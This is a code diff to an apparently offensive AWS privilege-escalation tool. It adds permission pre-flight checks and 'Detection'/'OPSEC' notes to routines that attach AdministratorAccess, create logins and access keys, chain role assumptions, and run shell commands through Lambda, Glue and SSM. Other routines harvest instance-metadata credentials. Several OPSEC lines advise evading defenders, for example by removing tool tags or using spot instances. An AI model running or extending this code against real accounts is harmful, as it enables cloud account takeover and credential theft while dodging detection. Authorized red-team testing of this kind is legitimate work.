@@ -71,6 +71,9 @@ export async function iamPrivesc(args: string[], timeout: number): Promise<HookR
       out.push(`\n[*] Cannot simulate (no iam:SimulatePrincipalPolicy permission) — check manually`)
     }
 
+    out.push(`\n[*] Detection:`)
+    out.push(`  CloudTrail: SimulatePrincipalPolicy, ListRoles, GetRole`)
+    out.push(`  GuardDuty: PrivilegeEscalation:IAMUser/AdministrativePermissions`)
     return { output: out.join("\n"), findings: [] }
   }
 
@@ -89,7 +92,7 @@ export async function iamPrivesc(args: string[], timeout: number): Promise<HookR
         findings: [],
       }
     }
-    return { output: `[-] AssumeRole failed: ${r.stderr.trim()}`, findings: [] }
+    return { output: `[-] AssumeRole failed: ${r.stderr.trim()}\n\n[*] Detection:\n  CloudTrail: AssumeRole\n  GuardDuty: UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS`, findings: [] }
   }
 
   if (method === "attach_policy") {
@@ -110,8 +113,8 @@ export async function iamPrivesc(args: string[], timeout: number): Promise<HookR
       region,
       timeout,
     )
-    if (r.exitCode === 0) return { output: `[+] AdministratorAccess attached to ${username}`, findings: [] }
-    return { output: `[-] attach_policy failed: ${r.stderr.trim()}`, findings: [] }
+    if (r.exitCode === 0) return { output: `[+] AdministratorAccess attached to ${username}\n\n[*] Detection:\n  CloudTrail: AttachUserPolicy\n  GuardDuty: PrivilegeEscalation:IAMUser/AdministrativePermissions`, findings: [] }
+    return { output: `[-] attach_policy failed: ${r.stderr.trim()}\n\n[*] Detection:\n  CloudTrail: AttachUserPolicy`, findings: [] }
   }
 
   if (method === "create_login") {
@@ -126,8 +129,8 @@ export async function iamPrivesc(args: string[], timeout: number): Promise<HookR
       timeout,
     )
     if (r.exitCode === 0)
-      return { output: `[+] Console login created for ${username}\n    Password: ${pw}`, findings: [] }
-    return { output: `[-] create_login failed: ${r.stderr.trim()}`, findings: [] }
+      return { output: `[+] Console login created for ${username}\n    Password: ${pw}\n\n[*] Detection:\n  CloudTrail: CreateLoginProfile\n  GuardDuty: Persistence:IAMUser/UserPermissions`, findings: [] }
+    return { output: `[-] create_login failed: ${r.stderr.trim()}\n\n[*] Detection:\n  CloudTrail: CreateLoginProfile`, findings: [] }
   }
 
   if (method === "create_key") {
@@ -138,11 +141,11 @@ export async function iamPrivesc(args: string[], timeout: number): Promise<HookR
     if (r.exitCode === 0) {
       const key = tryJson(r.stdout)?.AccessKey
       return {
-        output: `[+] Access key created for ${username}\n    AccessKeyId: ${key?.AccessKeyId}\n    SecretAccessKey: ${key?.SecretAccessKey}`,
+        output: `[+] Access key created for ${username}\n    AccessKeyId: ${key?.AccessKeyId}\n    SecretAccessKey: ${key?.SecretAccessKey}\n\n[*] Detection:\n  CloudTrail: CreateAccessKey\n  GuardDuty: Persistence:IAMUser/UserPermissions`,
         findings: [],
       }
     }
-    return { output: `[-] create_key failed: ${r.stderr.trim()}`, findings: [] }
+    return { output: `[-] create_key failed: ${r.stderr.trim()}\n\n[*] Detection:\n  CloudTrail: CreateAccessKey`, findings: [] }
   }
 
   return { output: `ERROR: Unknown method: ${method}`, findings: [] }
@@ -168,7 +171,7 @@ export async function policyVersionRollback(args: string[], timeout: number): Pr
     region,
     timeout,
   )
-  if (versions.exitCode !== 0) return { output: `[-] Cannot list versions: ${versions.stderr.trim()}`, findings: [] }
+  if (versions.exitCode !== 0) return { output: `[-] Cannot list versions: ${versions.stderr.trim()}\n\n[*] Detection:\n  CloudTrail: ListPolicyVersions`, findings: [] }
 
   const vl = tryJson(versions.stdout) || []
   const output = [`[*] Policy version rollback — ${policyArn}`, `[+] Versions: ${vl.length}\n`]
@@ -176,10 +179,40 @@ export async function policyVersionRollback(args: string[], timeout: number): Pr
 
   const nonDefault = vl.filter((v: (string | boolean)[]) => !v[1])
   if (nonDefault.length === 0)
-    return { output: output.join("\n") + "\n[-] Only one version, nothing to rollback", findings: [] }
+    return { output: output.join("\n") + "\n[-] Only one version, nothing to rollback\n\n[*] Detection:\n  CloudTrail: ListPolicyVersions", findings: [] }
 
   if (hasFlag(args, "--rollback")) {
     const target = argVal(args, "--version-id") || nonDefault[0][0]
+
+    const callerId = await aws(["sts", "get-caller-identity"], profile, region, timeout)
+    const callerArn = tryJson(callerId.stdout)?.Arn || ""
+    let sourceArn = callerArn
+    if (callerArn.includes(":assumed-role/")) {
+      const account = tryJson(callerId.stdout)?.Account || ""
+      const roleName = callerArn.split("/")[1] || ""
+      sourceArn = `arn:aws:iam::${account}:role/${roleName}`
+    }
+    const sim = await aws(
+      [
+        "iam", "simulate-principal-policy",
+        "--policy-source-arn", sourceArn,
+        "--action-names", "iam:SetDefaultPolicyVersion",
+        "--resource-arns", policyArn,
+        "--query", "EvaluationResults[0].EvalDecision",
+      ],
+      profile, region, timeout,
+    )
+    if (sim.exitCode === 0) {
+      const decision = tryJson(sim.stdout)
+      if (decision === "allowed") {
+        output.push(`\n[+] Pre-flight: SetDefaultPolicyVersion ALLOWED on ${policyArn}`)
+      } else {
+        output.push(`\n[-] Pre-flight: SetDefaultPolicyVersion DENIED — rollback will likely fail`)
+      }
+    } else {
+      output.push(`\n[*] Pre-flight: simulate unavailable — proceeding without dry-run`)
+    }
+
     const doc = await aws(
       [
         "iam",
@@ -207,6 +240,9 @@ export async function policyVersionRollback(args: string[], timeout: number): Pr
     )
     if (r.exitCode === 0) {
       output.push(`\n[+] Default version set to ${target}`)
+      output.push(`\n[*] Detection:`)
+      output.push(`  CloudTrail: ListPolicyVersions, GetPolicyVersion, SetDefaultPolicyVersion`)
+      output.push(`  GuardDuty: PrivilegeEscalation:IAMUser/AdministrativePermissions`)
       return {
         output: output.join("\n"),
         findings: [
@@ -224,11 +260,15 @@ export async function policyVersionRollback(args: string[], timeout: number): Pr
       }
     }
     output.push(`[-] Rollback failed: ${r.stderr.trim()}`)
+    output.push(`\n[*] Detection:`)
+    output.push(`  CloudTrail: ListPolicyVersions, GetPolicyVersion, SetDefaultPolicyVersion`)
   } else {
     output.push("\n[*] Use --rollback to change default version")
     output.push("[*] Use --version-id to specify target version")
   }
 
+  output.push(`\n[*] Detection:`)
+  output.push(`  CloudTrail: ListPolicyVersions, GetPolicyVersion`)
   return { output: output.join("\n"), findings: [] }
 }
 
@@ -243,6 +283,33 @@ export async function roleChain(args: string[], timeout: number): Promise<HookRe
   const output = [`[*] Role chain — ${roles.length} hop(s)\n`]
   const findings: Finding[] = []
   let currentCreds: Record<string, string> | undefined
+
+  const callerId = await aws(["sts", "get-caller-identity"], profile, region, timeout)
+  const callerArn = tryJson(callerId.stdout)?.Arn || ""
+  let sourceArn = callerArn
+  if (callerArn.includes(":assumed-role/")) {
+    const account = tryJson(callerId.stdout)?.Account || ""
+    const roleName = callerArn.split("/")[1] || ""
+    sourceArn = `arn:aws:iam::${account}:role/${roleName}`
+  }
+  const sim = await aws(
+    [
+      "iam", "simulate-principal-policy",
+      "--policy-source-arn", sourceArn,
+      "--action-names", "sts:AssumeRole",
+      "--resource-arns", ...roles,
+      "--query", "EvaluationResults[].[EvalResourceName,EvalDecision]",
+    ],
+    profile, region, timeout,
+  )
+  if (sim.exitCode === 0) {
+    const results = tryJson(sim.stdout) || []
+    output.push(`[*] Pre-flight AssumeRole simulation:`)
+    for (const r of results) {
+      output.push(`  ${r[1] === "allowed" ? "[+]" : "[-]"} ${r[0]} — ${r[1]}`)
+    }
+    output.push("")
+  }
 
   for (let i = 0; i < roles.length; i++) {
     const roleArn = roles[i]
@@ -299,6 +366,10 @@ export async function roleChain(args: string[], timeout: number): Promise<HookRe
     output.push(`    export AWS_SESSION_TOKEN=${currentCreds.SessionToken}`)
   }
 
+  output.push(`\n[*] Detection:`)
+  output.push(`  CloudTrail: AssumeRole (one event per hop)`)
+  output.push(`  GuardDuty: UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS`)
+  output.push(`  OPSEC: Each hop creates a separate CloudTrail event — chain depth is visible to defenders`)
   return { output: output.join("\n"), findings }
 }
 
@@ -313,6 +384,35 @@ export async function lambdaPrivesc(args: string[], timeout: number): Promise<Ho
 
   const output = [`[*] Lambda privilege escalation`, `[*] Target role: ${roleArn}`, `[*] Function: ${funcName}\n`]
   const findings: Finding[] = []
+
+  const callerId = await aws(["sts", "get-caller-identity"], profile, region, timeout)
+  const callerArn = tryJson(callerId.stdout)?.Arn || ""
+  let sourceArn = callerArn
+  if (callerArn.includes(":assumed-role/")) {
+    const account = tryJson(callerId.stdout)?.Account || ""
+    const rn = callerArn.split("/")[1] || ""
+    sourceArn = `arn:aws:iam::${account}:role/${rn}`
+  }
+  const sim = await aws(
+    [
+      "iam", "simulate-principal-policy",
+      "--policy-source-arn", sourceArn,
+      "--action-names", "iam:PassRole", "lambda:CreateFunction", "lambda:InvokeFunction",
+      "--query", "EvaluationResults[].[EvalActionName,EvalDecision]",
+    ],
+    profile, region, timeout,
+  )
+  if (sim.exitCode === 0) {
+    const results = tryJson(sim.stdout) || []
+    const denied = results.filter((r: [string, string]) => r[1] !== "allowed")
+    if (denied.length === 0) {
+      output.push(`[+] Pre-flight: PassRole + CreateFunction + InvokeFunction all ALLOWED`)
+    } else {
+      for (const d of denied) output.push(`[-] Pre-flight: ${d[0]} — ${d[1]}`)
+      output.push(`[!] Some required permissions denied — exploit may fail`)
+    }
+    output.push("")
+  }
 
   const code = `
 import subprocess, json
@@ -355,6 +455,7 @@ def handler(event, context):
 
     if (create.exitCode !== 0) {
       output.push(`[-] Function creation failed: ${create.stderr.trim()}`)
+      output.push(`\n[*] Detection:\n  CloudTrail: CreateFunction20150331 (failed attempt logged)`)
       return { output: output.join("\n"), findings }
     }
 
@@ -396,6 +497,10 @@ def handler(event, context):
       output.push(`[-] Invoke failed: ${invoke.stderr.trim()}`)
     }
 
+    output.push(`\n[*] Detection:`)
+    output.push(`  CloudTrail: CreateFunction20150331, Invoke20150331, PassRole`)
+    output.push(`  GuardDuty: PrivilegeEscalation:IAMUser/AdministrativePermissions`)
+    output.push(`  OPSEC: Function tagged CreatedBy=CyberStrike — remove tag or use anonymous function name`)
     return { output: output.join("\n"), findings }
   } finally {
     const { unlink } = await import("node:fs/promises")
@@ -415,7 +520,30 @@ export async function gluePrivesc(args: string[], timeout: number): Promise<Hook
   const output = [`[*] Glue privilege escalation`, `[*] Target role: ${roleArn}\n`]
   const findings: Finding[] = []
 
-  const script = `import subprocess; result = subprocess.run("${command}", shell=True, capture_output=True, text=True); print(result.stdout); print(result.stderr)`
+  const callerId = await aws(["sts", "get-caller-identity"], profile, region, timeout)
+  const callerArn = tryJson(callerId.stdout)?.Arn || ""
+  let sourceArn = callerArn
+  if (callerArn.includes(":assumed-role/")) {
+    const account = tryJson(callerId.stdout)?.Account || ""
+    const rn = callerArn.split("/")[1] || ""
+    sourceArn = `arn:aws:iam::${account}:role/${rn}`
+  }
+  const sim = await aws(
+    [
+      "iam", "simulate-principal-policy",
+      "--policy-source-arn", sourceArn,
+      "--action-names", "iam:PassRole", "glue:CreateJob", "glue:CreateDevEndpoint",
+      "--query", "EvaluationResults[].[EvalActionName,EvalDecision]",
+    ],
+    profile, region, timeout,
+  )
+  if (sim.exitCode === 0) {
+    const results = tryJson(sim.stdout) || []
+    for (const r of results) output.push(`[${r[1] === "allowed" ? "+" : "-"}] Pre-flight: ${r[0]} — ${r[1]}`)
+    output.push("")
+  }
+
+  const script =`import subprocess; result = subprocess.run("${command}", shell=True, capture_output=True, text=True); print(result.stdout); print(result.stderr)`
   const scriptPath = `s3://cyberstrike-temp-${Date.now()}/glue-privesc.py`
 
   output.push(`[*] Glue privesc requires:`)
@@ -466,6 +594,10 @@ export async function gluePrivesc(args: string[], timeout: number): Promise<Hook
     }
   }
 
+  output.push(`\n[*] Detection:`)
+  output.push(`  CloudTrail: GetJobs, GetDevEndpoints, CreateJob, CreateDevEndpoint, StartJobRun, PassRole`)
+  output.push(`  GuardDuty: PrivilegeEscalation:IAMUser/AdministrativePermissions`)
+  output.push(`  OPSEC: Glue jobs run in isolated Spark env — less visible than Lambda but CloudTrail still logs creation`)
   return { output: output.join("\n"), findings }
 }
 
@@ -476,6 +608,32 @@ export async function cloudformationPrivesc(args: string[], timeout: number): Pr
   const region = argVal(args, "--region")
   const output: string[] = [`[*] CloudFormation privilege escalation\n`]
   const findings: Finding[] = []
+
+  const callerId = await aws(["sts", "get-caller-identity"], profile, region, timeout)
+  const callerArn = tryJson(callerId.stdout)?.Arn || ""
+  let sourceArn = callerArn
+  if (callerArn.includes(":assumed-role/")) {
+    const account = tryJson(callerId.stdout)?.Account || ""
+    const rn = callerArn.split("/")[1] || ""
+    sourceArn = `arn:aws:iam::${account}:role/${rn}`
+  }
+
+  if (roleArn) {
+    const sim = await aws(
+      [
+        "iam", "simulate-principal-policy",
+        "--policy-source-arn", sourceArn,
+        "--action-names", "iam:PassRole", "cloudformation:CreateStack",
+        "--query", "EvaluationResults[].[EvalActionName,EvalDecision]",
+      ],
+      profile, region, timeout,
+    )
+    if (sim.exitCode === 0) {
+      const results = tryJson(sim.stdout) || []
+      for (const r of results) output.push(`[${r[1] === "allowed" ? "+" : "-"}] Pre-flight: ${r[0]} — ${r[1]}`)
+      output.push("")
+    }
+  }
 
   if (!roleArn) {
     output.push("[*] Enumerating CloudFormation stacks with IAM capabilities...\n")
@@ -522,6 +680,8 @@ export async function cloudformationPrivesc(args: string[], timeout: number): Pr
       }
     }
     output.push("\n[*] Use --role-arn to create a stack with IAM resource creation")
+    output.push(`\n[*] Detection:`)
+    output.push(`  CloudTrail: ListStacks, DescribeStacks`)
     return { output: output.join("\n"), findings }
   }
 
@@ -569,6 +729,7 @@ export async function cloudformationPrivesc(args: string[], timeout: number): Pr
 
   if (create.exitCode !== 0) {
     output.push(`[-] Stack creation failed: ${create.stderr.trim()}`)
+    output.push(`\n[*] Detection:\n  CloudTrail: CreateStack (failed attempt logged), PassRole`)
     return { output: output.join("\n"), findings }
   }
 
@@ -606,6 +767,10 @@ export async function cloudformationPrivesc(args: string[], timeout: number): Pr
     output.push("[-] Stack creation timed out or failed")
   }
 
+  output.push(`\n[*] Detection:`)
+  output.push(`  CloudTrail: CreateStack, DescribeStacks, PassRole, CreateUser, CreateAccessKey`)
+  output.push(`  GuardDuty: PrivilegeEscalation:IAMUser/AdministrativePermissions`)
+  output.push(`  OPSEC: Stack tagged CreatedBy=CyberStrike — visible in CFN console + CloudTrail`)
   return { output: output.join("\n"), findings }
 }
 
@@ -617,6 +782,29 @@ export async function ssmPrivesc(args: string[], timeout: number): Promise<HookR
   const region = argVal(args, "--region")
   const output: string[] = ["[*] SSM Privilege Escalation\n"]
   const findings: Finding[] = []
+
+  const callerId = await aws(["sts", "get-caller-identity"], profile, region, timeout)
+  const callerArn = tryJson(callerId.stdout)?.Arn || ""
+  let sourceArn = callerArn
+  if (callerArn.includes(":assumed-role/")) {
+    const account = tryJson(callerId.stdout)?.Account || ""
+    const rn = callerArn.split("/")[1] || ""
+    sourceArn = `arn:aws:iam::${account}:role/${rn}`
+  }
+  const sim = await aws(
+    [
+      "iam", "simulate-principal-policy",
+      "--policy-source-arn", sourceArn,
+      "--action-names", "ssm:DescribeInstanceInformation", "ssm:SendCommand", "ssm:GetCommandInvocation",
+      "--query", "EvaluationResults[].[EvalActionName,EvalDecision]",
+    ],
+    profile, region, timeout,
+  )
+  if (sim.exitCode === 0) {
+    const results = tryJson(sim.stdout) || []
+    for (const r of results) output.push(`[${r[1] === "allowed" ? "+" : "-"}] Pre-flight: ${r[0]} — ${r[1]}`)
+    output.push("")
+  }
 
   const instances = await aws(
     [
@@ -678,6 +866,7 @@ export async function ssmPrivesc(args: string[], timeout: number): Promise<HookR
   if (!instanceId) {
     output.push("\n[*] Use --instance-id ID to execute commands via SSM")
     output.push("[*] Target instances with high-priv IAM roles for credential harvesting")
+    output.push(`\n[*] Detection:\n  CloudTrail: DescribeInstanceInformation, ListAttachedRolePolicies`)
     return { output: output.join("\n"), findings }
   }
 
@@ -702,6 +891,7 @@ export async function ssmPrivesc(args: string[], timeout: number): Promise<HookR
 
   if (r.exitCode !== 0) {
     output.push(`[-] Command failed: ${r.stderr.trim()}`)
+    output.push(`\n[*] Detection:\n  CloudTrail: SendCommand (failed attempt logged)`)
     return { output: output.join("\n"), findings }
   }
 
@@ -735,6 +925,10 @@ export async function ssmPrivesc(args: string[], timeout: number): Promise<HookR
     }
   }
 
+  output.push(`\n[*] Detection:`)
+  output.push(`  CloudTrail: SendCommand, GetCommandInvocation, DescribeInstanceInformation`)
+  output.push(`  GuardDuty: Execution:EC2/MaliciousFile (if payload triggers), UnauthorizedAccess:EC2/MetadataDNSRebind`)
+  output.push(`  OPSEC: SSM command history visible in Systems Manager console — all commands are logged`)
   return { output: output.join("\n"), findings }
 }
 
@@ -744,6 +938,32 @@ export async function ec2Privesc(args: string[], timeout: number): Promise<HookR
   const region = argVal(args, "--region")
   const output: string[] = ["[*] EC2 Instance Profile Privilege Escalation\n"]
   const findings: Finding[] = []
+
+  const callerId = await aws(["sts", "get-caller-identity"], profile, region, timeout)
+  const callerArn = tryJson(callerId.stdout)?.Arn || ""
+  let sourceArn = callerArn
+  if (callerArn.includes(":assumed-role/")) {
+    const account = tryJson(callerId.stdout)?.Account || ""
+    const rn = callerArn.split("/")[1] || ""
+    sourceArn = `arn:aws:iam::${account}:role/${rn}`
+  }
+
+  if (profileArn) {
+    const sim = await aws(
+      [
+        "iam", "simulate-principal-policy",
+        "--policy-source-arn", sourceArn,
+        "--action-names", "iam:PassRole", "ec2:RunInstances",
+        "--query", "EvaluationResults[].[EvalActionName,EvalDecision]",
+      ],
+      profile, region, timeout,
+    )
+    if (sim.exitCode === 0) {
+      const results = tryJson(sim.stdout) || []
+      for (const r of results) output.push(`[${r[1] === "allowed" ? "+" : "-"}] Pre-flight: ${r[0]} — ${r[1]}`)
+      output.push("")
+    }
+  }
 
   if (!profileArn) {
     const profiles = await aws(
@@ -788,6 +1008,7 @@ export async function ec2Privesc(args: string[], timeout: number): Promise<HookR
       }
     }
     output.push("\n[*] Use --instance-profile-arn to launch EC2 with specific profile")
+    output.push(`\n[*] Detection:\n  CloudTrail: ListInstanceProfiles, ListAttachedRolePolicies`)
     return { output: output.join("\n"), findings }
   }
 
@@ -801,6 +1022,10 @@ export async function ec2Privesc(args: string[], timeout: number): Promise<HookR
   output.push(`    4. curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE>`)
   output.push(`    5. Use harvested credentials`)
 
+  output.push(`\n[*] Detection:`)
+  output.push(`  CloudTrail: RunInstances, PassRole`)
+  output.push(`  GuardDuty: Recon:EC2/PortProbeUnprotectedPort, UnauthorizedAccess:EC2/MetadataDNSRebind`)
+  output.push(`  OPSEC: EC2 instances visible in console + billing — use spot instances for short-lived access`)
   return { output: output.join("\n"), findings }
 }
 
@@ -814,6 +1039,33 @@ export async function permissionBoundaryBypass(args: string[], timeout: number):
   if (id.exitCode !== 0) return { output: `[-] Not authenticated: ${id.stderr.trim()}`, findings }
   const identity = tryJson(id.stdout)
   output.push(`[+] Identity: ${identity?.Arn}\n`)
+
+  let sourceArn = identity?.Arn || ""
+  if ((sourceArn as string).includes(":assumed-role/")) {
+    const account = identity?.Account || ""
+    const rn = (sourceArn as string).split("/")[1] || ""
+    sourceArn = `arn:aws:iam::${account}:role/${rn}`
+  }
+  const sim = await aws(
+    [
+      "iam", "simulate-principal-policy",
+      "--policy-source-arn", sourceArn as string,
+      "--action-names", "iam:DeleteUserPermissionsBoundary", "iam:PutUserPermissionsBoundary",
+        "iam:DeleteRolePermissionsBoundary", "iam:PutRolePermissionsBoundary",
+        "iam:CreateUser", "iam:CreateRole",
+      "--query", "EvaluationResults[].[EvalActionName,EvalDecision]",
+    ],
+    profile, region, timeout,
+  )
+  if (sim.exitCode === 0) {
+    const results = tryJson(sim.stdout) || []
+    const allowed = results.filter((r: [string, string]) => r[1] === "allowed")
+    if (allowed.length > 0) {
+      output.push(`[!] Pre-flight boundary bypass actions:`)
+      for (const r of allowed) output.push(`  [+] ${r[0]} — ALLOWED`)
+      output.push("")
+    }
+  }
 
   const arnParts = (identity?.Arn || "").split("/")
   const entityType = (identity?.Arn || "").includes(":user/") ? "user" : "role"
@@ -902,6 +1154,10 @@ export async function permissionBoundaryBypass(args: string[], timeout: number):
     }
   }
 
+  output.push(`\n[*] Detection:`)
+  output.push(`  CloudTrail: GetUser, GetRole, GetPolicy, GetPolicyVersion, SimulatePrincipalPolicy`)
+  output.push(`  GuardDuty: PrivilegeEscalation:IAMUser/AdministrativePermissions (if boundary removed)`)
+  output.push(`  OPSEC: Boundary deletion/modification is a high-signal event — SOC will likely alert`)
   return { output: output.join("\n"), findings }
 }
 
@@ -911,6 +1167,32 @@ export async function sagemakerPrivesc(args: string[], timeout: number): Promise
   const region = argVal(args, "--region")
   const output: string[] = ["[*] SageMaker Privilege Escalation\n"]
   const findings: Finding[] = []
+
+  const callerId = await aws(["sts", "get-caller-identity"], profile, region, timeout)
+  const callerArn = tryJson(callerId.stdout)?.Arn || ""
+  let sourceArn = callerArn
+  if (callerArn.includes(":assumed-role/")) {
+    const account = tryJson(callerId.stdout)?.Account || ""
+    const rn = callerArn.split("/")[1] || ""
+    sourceArn = `arn:aws:iam::${account}:role/${rn}`
+  }
+
+  if (roleArn) {
+    const sim = await aws(
+      [
+        "iam", "simulate-principal-policy",
+        "--policy-source-arn", sourceArn,
+        "--action-names", "iam:PassRole", "sagemaker:CreateNotebookInstance", "sagemaker:CreatePresignedNotebookInstanceUrl",
+        "--query", "EvaluationResults[].[EvalActionName,EvalDecision]",
+      ],
+      profile, region, timeout,
+    )
+    if (sim.exitCode === 0) {
+      const results = tryJson(sim.stdout) || []
+      for (const r of results) output.push(`[${r[1] === "allowed" ? "+" : "-"}] Pre-flight: ${r[0]} — ${r[1]}`)
+      output.push("")
+    }
+  }
 
   const notebooks = await aws(
     [
@@ -967,6 +1249,7 @@ export async function sagemakerPrivesc(args: string[], timeout: number): Promise
   if (!roleArn) {
     output.push("\n[*] Use --role-arn to create notebook/training job with specific role")
     output.push("[*] Privesc via SageMaker requires: sagemaker:CreateNotebookInstance + iam:PassRole")
+    output.push(`\n[*] Detection:\n  CloudTrail: ListNotebookInstances, ListTrainingJobs`)
     return { output: output.join("\n"), findings }
   }
 
@@ -979,6 +1262,10 @@ export async function sagemakerPrivesc(args: string[], timeout: number): Promise
   output.push(`    3. aws sagemaker create-presigned-notebook-instance-url --notebook-instance-name cs-privesc`)
   output.push(`    4. Open URL, use terminal to access role credentials`)
 
+  output.push(`\n[*] Detection:`)
+  output.push(`  CloudTrail: CreateNotebookInstance, CreatePresignedNotebookInstanceUrl, PassRole`)
+  output.push(`  GuardDuty: PrivilegeEscalation:IAMUser/AdministrativePermissions`)
+  output.push(`  OPSEC: SageMaker notebooks bill per-hour and are visible in console — terminate after use`)
   return { output: output.join("\n"), findings }
 }
 
@@ -1421,6 +1708,14 @@ export async function autoPrivescScan(args: string[], timeout: number): Promise<
     }
   }
   output.push(`\n[*] Total findings: ${findings.length}`)
+
+  output.push(`\n[*] Detection:`)
+  output.push(`  CloudTrail: SimulatePrincipalPolicy (${PRIVESC_VECTORS.length}× calls), GetCallerIdentity, ListRoles`)
+  if (!useSimulation) {
+    output.push(`  CloudTrail: ListAttachedUserPolicies, ListUserPolicies, GetPolicy, GetPolicyVersion (policy-crawl fallback)`)
+  }
+  output.push(`  GuardDuty: Recon:IAMUser/UserPermissions (high volume of IAM enumeration)`)
+  output.push(`  OPSEC: ~${PRIVESC_VECTORS.length + 5} API calls in rapid succession — anomaly detectors may flag burst`)
 
   return { output: output.join("\n"), findings }
 }
